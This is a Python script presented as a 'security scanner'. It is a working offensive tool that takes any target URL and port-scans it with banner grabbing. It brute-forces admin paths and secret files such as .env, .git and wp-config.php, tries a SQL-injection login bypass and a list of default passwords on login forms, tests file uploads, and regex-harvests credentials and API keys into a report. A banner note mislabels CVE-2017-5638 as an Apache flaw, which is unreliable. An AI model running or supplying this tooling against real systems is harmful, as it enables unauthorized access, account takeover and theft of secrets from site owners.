import requests
import socket
import threading
import json
import re
import time
import ssl
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from datetime import datetime
import logging
import whois
import dns.resolver

# Disable warnings for unverified HTTPS requests
requests.packages.urllib3.disable_warnings()

# ================= CONFIG =================
DEFAULT_TIMEOUT = 5
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 8080, 8443, 8888]
BANNER_GRAB_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 3306, 3389]
VULN_PATTERNS = {
    "Apache/2.2": "Outdated Apache version (pre-2.4), vulnerable to CVE-2017-5638",
    "PHP/5.": "Outdated PHP version, may be vulnerable to multiple CVEs",
    "nginx/1.": "Outdated nginx version, check for known CVEs",
    "IIS/6.": "Outdated IIS version, vulnerable to multiple CVEs"
}

# Expanded directory brute-force list
COMMON_DIRECTORIES = [
    "/admin", "/backup", "/config", "/db", "/logs", "/test", "/upload",
    "/wp-admin", "/wp-content", "/wp-includes", "/uploads", "/files",
    "/images", "/css", "/js", "/vendor", "/assets", "/cgi-bin", "/scripts",
    "/private", "/tmp", "/temp", "/data", "/download", "/archive", "/old",
    "/new", "/demo", "/dev", "/stage", "/prod", "/backups", "/sql",
    "/database", "/phpmyadmin", "/adminer", "/pma", "/myadmin", "/mysql",
    "/pgadmin", "/mongodb", "/phpinfo", "/info", "/test", "/tests",
    "/examples", "/sample", "/samples", "/doc", "/docs", "/documentation",
    "/api", "/rest", "/soap", "/graphql", "/swagger", "/redoc",
    "/.git", "/.svn", "/.hg", "/.env", "/.aws", "/.azure", "/.config",
    "/.npm", "/.yarn", "/.composer", "/.docker", "/.idea", "/.vscode",
    "/node_modules", "/bower_components", "/vendor", "/lib", "/src",
    "/dist", "/build", "/out", "/target", "/bin", "/obj", "/.metadata",
    "/.settings", "/.project", "/.classpath", "/.gradle", "/.mvn",
    "/.serverless", "/.terraform", "/.circleci", "/.github", "/.gitlab",
    "/.env.local", "/.env.dev", "/.env.prod", "/.env.stage",
    "/config.php", "/configuration.php", "/settings.php", "/wp-config.php",
    "/web.config", "/.htaccess", "/.htpasswd",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.well-known/security.txt", "/.well-known/acme-challenge"
]

COMMON_FILES = [
    "index.php", "index.html", "index.htm", "default.php", "default.html",
    "login.php", "admin.php", "dashboard.php", "user.php", "account.php",
    "config.php", "configuration.php", "settings.php", "wp-config.php",
    ".env", ".git/config", ".svn/entries", ".hg/hgrc",
    "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql", "db_backup.sql",
    "database.sql", "data.sql", "export.sql", "import.sql",
    "error.log", "access.log", "debug.log", "log.txt", "logs.txt",
    "phpinfo.php", "info.php", "test.php", "info.html", "test.html",
    "readme.html", "README.md", "CHANGELOG.md", "LICENSE",
    "composer.json", "package.json", "bower.json", "gulpfile.js", "gruntfile.js",
    "webpack.config.js", "rollup.config.js", "tsconfig.json",
    "Dockerfile", "docker-compose.yml", "Makefile", "build.gradle", "pom.xml"
]

COMMON_SUBDIRS = [
    "images", "img", "css", "js", "fonts", "uploads", "files", "media",
    "assets", "static", "public", "resources", "res", "src", "source",
    "lib", "vendor", "node_modules", "bower_components", "components",
    "includes", "inc", "modules", "mod", "plugins", "plg", "themes",
    "templates", "views", "pages", "partials", "elements", "blocks",
    "api", "rest", "soap", "graphql", "swagger", "docs", "documentation",
    "tests", "test", "examples", "samples", "demo", "dev", "stage", "prod"
]

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "password"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
    ("webmaster", "webmaster"),
    ("admin", "admin1"),
    ("admin", "admin!@#"),
    ("admin", "Admin@123"),
    ("administrator", "admin"),
    ("Administrator", "Password1"),
]

SENSITIVE_PATTERNS = [
    r"(?i)(DB_|DATABASE_)(USERNAME|PASSWORD|HOST|NAME)\s*[=:]\s*['\"]?([^'\"]+)",
    r"(?i)(MYSQL|POSTGRES|MONGO|REDIS)_(USER|PASS|PASSWORD|HOST|DB)\s*[=:]\s*['\"]?([^'\"]+)",
    r"(?i)(AWS_|AZURE_|GCP_)(ACCESS_KEY|SECRET_KEY|KEY|SECRET)\s*[=:]\s*['\"]?([^'\"]+)",
    r"(?i)(API_KEY|API_SECRET|APP_KEY|APP_SECRET)\s*[=:]\s*['\"]?([^'\"]+)",
    r"(?i)(PASSWORD|PASSWD|PASSPHRASE)\s*[=:]\s*['\"]?([^'\"]+)",
    r"(?i)(SECRET|SECRET_KEY)\s*[=:]\s*['\"]?([^'\"]+)",
    r"(?i)(TOKEN|AUTH_TOKEN|BEARER)\s*[=:]\s*['\"]?([^'\"]+)"
]

# XSS and SQLi payloads
XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOAD = "' OR '1'='1"

# Setup logging
logging.basicConfig(filename="anish_scanner.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ================= BANNER =================
def print_banner():
    print(r"""
     █████╗ ███╗   ██╗██╗███████╗██╗  ██╗    ██╗  ██╗██╗   ██╗███████╗██╗  ██╗██╗    ██╗ █████╗ ██╗  ██╗ █████
    ██╔══██╗████╗  ██║██║██╔════╝██║  ██║    ██║ ██╔╝██║   ██║██╔════╝██║  ██║██║    ██║██╔══██╗██║  ██║██╔══██╗
    ███████║██╔██╗ ██║██║███████╗███████║    █████╔╝ ██║   ██║███████╗███████║██║ █╗ ██║███████║███████║███████║
    ██╔══██║██║╚██╗██║██║╚════██║██╔══██║    ██╔═██╗ ██║   ██║╚════██║██╔══██║██║███╗██║██╔══██║██╔══██║██╔══██║
    ██║  ██║██║ ╚████║██║███████║██║  ██║    ██║  ██╗╚██████╔╝███████║██║  ██║╚███╔███╔╝██║  ██║██║  ██║██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

    Anish... Security Scanner v4.1 💀☠️
    Created by :-  𝔸ℕ𝕀𝕊ℍ 𝕂𝕌𝕊ℍ𝕎𝔸ℍ𝔸
    Website    :-  Anish-Kushwaha.online
    Email      :-  Anish-Kushwaha@zohomail.in
    Enhanced with deep directory exploitation and security header analysis!
""")

# ================= UTILITY FUNCTIONS =================
def parse_url_and_detect_port(url):
    parsed = urlparse(url)
    domain = parsed.netloc.split(':')[0]
    port = parsed.port
    if not port:
        port = 443 if parsed.scheme == 'https' else 80
    return domain, port

def resolve_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"[!] Error resolving IP for {domain}: {e}")
        return None

def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=DEFAULT_TIMEOUT)
        data = response.json()
        if data['status'] == 'success':
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "isp": data.get("isp", "Unknown")
            }
        else:
            return {"error": "Geolocation failed"}
    except Exception as e:
        return {"error": str(e)}

def get_whois_info(domain):
    try:
        w = whois.whois(domain)
        return {
            "registrar": w.registrar,
            "creation_date": str(w.creation_date),
            "expiration_date": str(w.expiration_date),
            "name_servers": w.name_servers
        }
    except Exception as e:
        return {"error": f"WHOIS lookup failed: {str(e)}"}

def get_dns_records(domain):
    records = {}
    try:
        for record_type in ['A', 'MX', 'TXT', 'CNAME', 'NS']:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                records[record_type] = [str(rdata) for rdata in answers]
            except Exception:
                records[record_type] = []
    except Exception as e:
        records["error"] = str(e)
    return records

def get_ssl_certificate(domain, port=443):
    """Retrieve SSL certificate details."""
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=DEFAULT_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                return {
                    "subject": dict(x[0] for x in cert['subject']),
                    "issuer": dict(x[0] for x in cert['issuer']),
                    "version": cert.get('version'),
                    "serialNumber": cert.get('serialNumber'),
                    "notBefore": cert.get('notBefore'),
                    "notAfter": cert.get('notAfter'),
                    "subjectAltName": [item[1] for item in cert.get('subjectAltName', [])]
                }
    except Exception as e:
        return {"error": str(e)}

def check_security_headers(headers):
    """Analyze HTTP security headers."""
    security_headers = {
        'Strict-Transport-Security': 'HSTS',
        'Content-Security-Policy': 'CSP',
        'X-Content-Type-Options': 'X-Content-Type-Options',
        'X-Frame-Options': 'X-Frame-Options',
        'X-XSS-Protection': 'X-XSS-Protection',
        'Referrer-Policy': 'Referrer-Policy',
        'Permissions-Policy': 'Permissions-Policy'
    }
    present = []
    missing = []
    for header, name in security_headers.items():
        if header in headers:
            present.append(f"{name}: {headers[header]}")
        else:
            missing.append(name)
    return present, missing

# ================= NETWORK SCANNER =================
def scan_port(ip, port, results, rate_limit=0.01):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(DEFAULT_TIMEOUT)
            result = sock.connect_ex((ip, port))
            if result == 0:
                banner = ""
                if port in BANNER_GRAB_PORTS:
                    try:
                        sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode(errors="ignore")
                    except:
                        banner = "Open, but no banner"
                vuln_info = check_vuln_banner(banner)
                results.append((port, banner.strip(), vuln_info))
                logging.info(f"Port {port} open on {ip}: {banner.strip()} - {vuln_info}")
    except Exception as e:
        logging.error(f"Error scanning port {port} on {ip}: {e}")
    finally:
        time.sleep(rate_limit)

def check_vuln_banner(banner):
    for pattern, desc in VULN_PATTERNS.items():
        if pattern in banner:
            return f"⚠️ {desc}"
    return "No known vulnerabilities detected"

def run_network_scan(ip, port_range=COMMON_PORTS):
    print("\n" + "*"*50)
    print(f"[🔍] Running network scan on {ip}...")
    threads = []
    results = []
    for port in port_range:
        thread = threading.Thread(target=scan_port, args=(ip, port, results))
        thread.start()
        threads.append(thread)
    for t in threads:
        t.join()
    print("\n[+] Open Ports:")
    for port, banner, vuln_info in sorted(results):
        print(f"  Port {port}/tcp - {banner} - {vuln_info}")
    return results

# ================= DIRECTORY EXPLORATION & EXPLOITATION =================
def check_directory_listing(soup, base_url, current_url, results, session):
    links = []
    for a in soup.find_all('a', href=True):
        href = a['href']
        if href in ('../', '/'):
            continue
        full_url = urljoin(current_url, href)
        if not full_url.startswith(base_url):
            continue
        links.append(full_url)
    if links:
        print(f"    [*] Directory listing enabled at {current_url}, found {len(links)} items.")
        for link in links:
            if any(link.endswith(ext) for ext in ['.zip', '.tar', '.gz', '.sql', '.bak', '.old', '.txt', '.log', '.conf', '.php', '.env', '.git', '.svn']):
                try:
                    r = session.get(link, verify=False, timeout=DEFAULT_TIMEOUT)
                    if r.status_code == 200:
                        print(f"      [!] Accessible file: {link} ({len(r.content)} bytes)")
                        if link.endswith(('.txt', '.log', '.conf', '.php', '.env', '.sql', '.bak', '.old')):
                            check_sensitive_data(r.text, link, results)
                        results.append({
                            "type": "Exposed File",
                            "url": link,
                            "severity": "Medium",
                            "details": f"File size: {len(r.content)} bytes"
                        })
                        logging.warning(f"Exposed file found: {link}")
                except Exception:
                    pass

def check_sensitive_data(text, source_url, results):
    for pattern in SENSITIVE_PATTERNS:
        matches = re.findall(pattern, text)
        if matches:
            for match in matches:
                found = ' '.join([m for m in match if m])
                print(f"        [!] Possible sensitive info in {source_url}: {found}")
                results.append({
                    "type": "Sensitive Information Disclosure",
                    "url": source_url,
                    "severity": "High",
                    "details": f"Pattern matched: {found}"
                })
                logging.warning(f"Sensitive data in {source_url}: {found}")

def test_login_form(form, form_url, session, results):
    inputs = form.find_all('input')
    user_field = None
    pass_field = None
    other_fields = {}
    for inp in inputs:
        name = inp.get('name')
        if not name:
            continue
        inp_type = inp.get('type', 'text')
        if inp_type == 'password':
            pass_field = name
        elif inp_type in ('text', 'email', 'username'):
            if not user_field or 'user' in name.lower() or 'login' in name.lower():
                user_field = name
        else:
            other_fields[name] = inp.get('value', '')

    if not user_field or not pass_field:
        return

    # SQLi bypass
    payload = {
        user_field: "admin' OR '1'='1",
        pass_field: "anything"
    }
    payload.update(other_fields)
    action = form.get('action')
    method = form.get('method', 'get').lower()
    target_url = urljoin(form_url, action) if action else form_url

    try:
        if method == 'post':
            r = session.post(target_url, data=payload, verify=False, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
        else:
            r = session.get(target_url, params=payload, verify=False, timeout=DEFAULT_TIMEOUT, allow_redirects=False)

        if r.status_code in (301, 302):
            print(f"      [!] Possible SQLi bypass at {target_url} (redirect)")
            results.append({
                "type": "SQL Injection Bypass",
                "url": target_url,
                "severity": "Critical",
                "details": "Login bypass via SQLi payload"
            })
            logging.warning(f"SQLi bypass at {target_url}")
    except Exception:
        pass

    # Default credentials brute-force
    for user, pwd in DEFAULT_CREDENTIALS:
        payload = {
            user_field: user,
            pass_field: pwd
        }
        payload.update(other_fields)
        try:
            if method == 'post':
                r = session.post(target_url, data=payload, verify=False, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            else:
                r = session.get(target_url, params=payload, verify=False, timeout=DEFAULT_TIMEOUT, allow_redirects=False)

            if r.status_code in (301, 302):
                print(f"      [!] Default credentials worked: {user}:{pwd} at {target_url}")
                results.append({
                    "type": "Default Credentials",
                    "url": target_url,
                    "severity": "High",
                    "details": f"Username: {user}, Password: {pwd}"
                })
                logging.warning(f"Default credentials {user}:{pwd} at {target_url}")
                break
        except Exception:
            pass

def test_upload_form(form, form_url, session, results):
    file_input = form.find('input', {'type': 'file'})
    if not file_input:
        return
    file_field = file_input.get('name')
    if not file_field:
        return

    files = {file_field: ('test.txt', 'This is a test file.', 'text/plain')}
    action = form.get('action')
    method = form.get('method', 'post').lower()
    target_url = urljoin(form_url, action) if action else form_url

    try:
        r = session.post(target_url, files=files, verify=False, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
        possible_paths = [
            urljoin(form_url, 'uploads/test.txt'),
            urljoin(form_url, 'files/test.txt'),
            urljoin(form_url, 'test.txt'),
            urljoin(target_url, '../uploads/test.txt'),
            urljoin(target_url, 'test.txt')
        ]
        for path in possible_paths:
            try:
                check = session.get(path, verify=False, timeout=DEFAULT_TIMEOUT)
                if check.status_code == 200 and 'test file' in check.text:
                    print(f"      [!] File upload successful! Uploaded file accessible at: {path}")
                    results.append({
                        "type": "File Upload Vulnerability",
                        "url": target_url,
                        "severity": "High",
                        "details": f"Uploaded test.txt accessible at {path}"
                    })
                    logging.warning(f"File upload at {target_url}, file accessible at {path}")
                    break
            except Exception:
                pass
    except Exception:
        pass

def explore_directory(base_url, directory, session, results, depth=1):
    dir_url = urljoin(base_url, directory)
    print(f"\n  [*] Exploring directory: {dir_url}")

    try:
        r = session.get(dir_url, verify=False, timeout=DEFAULT_TIMEOUT)
        if r.status_code != 200:
            return
        soup = BeautifulSoup(r.text, "html.parser")

        check_directory_listing(soup, base_url, dir_url, results, session)

        forms = soup.find_all('form')
        for form in forms:
            test_login_form(form, dir_url, session, results)
            test_upload_form(form, dir_url, session, results)

        print(f"    [*] Checking for common files in {directory}...")
        for fname in COMMON_FILES:
            file_url = urljoin(dir_url + '/', fname)
            try:
                rf = session.get(file_url, verify=False, timeout=DEFAULT_TIMEOUT)
                if rf.status_code == 200:
                    print(f"      [!] Accessible file: {file_url}")
                    if any(fname.endswith(ext) for ext in ['.txt', '.php', '.env', '.sql', '.conf', '.log', '.bak', '.old', '.git', '.svn', '.yml', '.json', '.xml', '.ini']):
                        check_sensitive_data(rf.text, file_url, results)
                    results.append({
                        "type": "Exposed File",
                        "url": file_url,
                        "severity": "Medium",
                        "details": "File accessible"
                    })
                    logging.warning(f"Exposed file found: {file_url}")
            except Exception:
                pass

        if depth > 0:
            print(f"    [*] Checking for subdirectories under {directory}...")
            for subdir in COMMON_SUBDIRS:
                subdir_url = urljoin(dir_url + '/', subdir)
                try:
                    rs = session.get(subdir_url, verify=False, timeout=DEFAULT_TIMEOUT)
                    if rs.status_code == 200:
                        print(f"      [!] Found subdirectory: {subdir_url}")
                        results.append({
                            "type": "Exposed Subdirectory",
                            "url": subdir_url,
                            "severity": "Low",
                            "details": "Subdirectory accessible"
                        })
                        logging.warning(f"Subdirectory found: {subdir_url}")
                        explore_directory(base_url, subdir_url.replace(base_url, ''), session, results, depth-1)
                except Exception:
                    pass

    except Exception as e:
        print(f"    [!] Error exploring {dir_url}: {e}")

# ================= WEB VULNERABILITY SCANNER =================
def scan_web_vulnerabilities(base_url):
    print("\n[🕸️] Scanning for web vulnerabilities and grabbing hidden details...")
    results = []
    session = requests.Session()

    try:
        r = session.get(base_url, verify=False, timeout=DEFAULT_TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")

        # Page info
        title = soup.title.string.strip() if soup.title else "No title"
        meta_tags = {meta.get('name'): meta.get('content') for meta in soup.find_all('meta') if meta.get('name')}
        headers = dict(r.headers)

        print(f"\n[+] Page Title: {title}")
        print(f"[+] Meta Tags: {meta_tags}")
        print(f"[+] Response Headers:")
        for k, v in headers.items():
            print(f"    {k}: {v}")

        # Security headers analysis
        present, missing = check_security_headers(headers)
        if present:
            print("[+] Security Headers Present:")
            for h in present:
                print(f"    {h}")
        if missing:
            print("[-] Missing Security Headers:")
            for h in missing:
                print(f"    {h}")

        results.append({"type": "Page Info", "title": title, "meta": meta_tags, "headers": headers})

        # XSS test
        xss_url = urljoin(base_url, f"?test={XSS_PAYLOAD}")
        r_xss = session.get(xss_url, verify=False, timeout=DEFAULT_TIMEOUT)
        if XSS_PAYLOAD in r_xss.text:
            print(f"[!] Potential XSS vulnerability at {xss_url}")
            results.append({"type": "XSS", "url": xss_url, "severity": "High"})
            logging.warning(f"XSS detected at {xss_url}")

        # SQLi test
        sqli_url = urljoin(base_url, f"?id={SQLI_PAYLOAD}")
        r_sqli = session.get(sqli_url, verify=False, timeout=DEFAULT_TIMEOUT)
        if "mysql" in r_sqli.text.lower() or "sql syntax" in r_sqli.text.lower():
            print(f"[!] Potential SQLi vulnerability at {sqli_url}")
            results.append({"type": "SQLi", "url": sqli_url, "severity": "Critical"})
            logging.warning(f"SQLi detected at {sqli_url}")

        # Directory brute-force
        print("\n[*] Brute-forcing directories (expanded list)...")
        found_dirs = []
        for directory in COMMON_DIRECTORIES:
            dir_url = urljoin(base_url, directory)
            try:
                r_dir = session.get(dir_url, verify=False, timeout=DEFAULT_TIMEOUT)
                if r_dir.status_code == 200:
                    print(f"[!] Found accessible directory: {dir_url}")
                    found_dirs.append(directory)
                    results.append({"type": "Exposed Directory", "url": dir_url, "severity": "Medium"})
                    logging.warning(f"Exposed directory: {dir_url}")
            except Exception:
                pass

        # Deep exploration of found directories
        for directory in found_dirs:
            explore_directory(base_url, directory, session, results, depth=1)

    except Exception as e:
        print(f"[!] Error scanning web: {e}")
        logging.error(f"Web scan error for {base_url}: {e}")

    return results

# ================= REPORT GENERATOR =================
def generate_report(url, ip, domain, geolocation, whois_info, dns_records, ssl_info, port, network_results, web_results, output_file="anish_scanner_report.json"):
    report = {
        "timestamp": datetime.now().isoformat(),
        "target_url": url,
        "target_ip": ip,
        "domain": domain,
        "geolocation": geolocation,
        "whois": whois_info,
        "dns_records": dns_records,
        "ssl_certificate": ssl_info,
        "target_port": port,
        "network_scan": [
            {"port": port, "banner": banner, "vulnerabilities": vuln_info}
            for port, banner, vuln_info in network_results
        ],
        "web_vulnerabilities": web_results
    }
    with open(output_file, "w") as f:
        json.dump(report, f, indent=4)
    print(f"\n[📝] Report generated: {output_file}")
    logging.info(f"Report generated: {output_file}")

# ================= MAIN =================
if __name__ == "__main__":
    print_banner()
    target_url = input("Enter the target URL (e.g., https://example.com or example.com:8443): ").strip()
    print()

    if not target_url:
        print("[!] Error: Target URL is required.")
        exit(1)

    if not urlparse(target_url).scheme:
        target_url = "https://" + target_url
        print(f"[+] Auto-corrected URL to: {target_url}")

    domain, target_port = parse_url_and_detect_port(target_url)
    print(f"[+] Parsed Domain: {domain}")
    print(f"[+] Detected Port: {target_port}")

    ip = resolve_ip(domain)
    if not ip:
        print("[!] Could not resolve IP. Exiting.")
        exit(1)
    print(f"[+] Resolved IP: {ip}")

    geolocation = get_geolocation(ip)
    print(f"[+] Geolocation: {geolocation}")

    whois_info = get_whois_info(domain)
    print(f"[+] WHOIS Info: {whois_info}")

    dns_records = get_dns_records(domain)
    print(f"[+] DNS Records:")
    for rtype, records in dns_records.items():
        if records:
            print(f"    {rtype}: {', '.join(records)}")

    ssl_info = get_ssl_certificate(domain, target_port) if target_port == 443 else {"note": "Not HTTPS or non-standard port"}
    if "error" not in ssl_info:
        print(f"[+] SSL Certificate:")
        print(f"    Subject: {ssl_info.get('subject', 'N/A')}")
        print(f"    Issuer: {ssl_info.get('issuer', 'N/A')}")
        print(f"    Valid from: {ssl_info.get('notBefore')} to {ssl_info.get('notAfter')}")
    else:
        print(f"[!] SSL Certificate info unavailable: {ssl_info.get('error')}")

    start_time = datetime.now()

    network_results = run_network_scan(ip)
    web_results = scan_web_vulnerabilities(target_url)

    generate_report(target_url, ip, domain, geolocation, whois_info, dns_records, ssl_info, target_port, network_results, web_results)

    print("\n[✔] Scan completed in", datetime.now() - start_time)
    print()
    print("⚠️  REMINDER: Unauthorized scanning is illegal. Use only on systems you own or have permission for.")
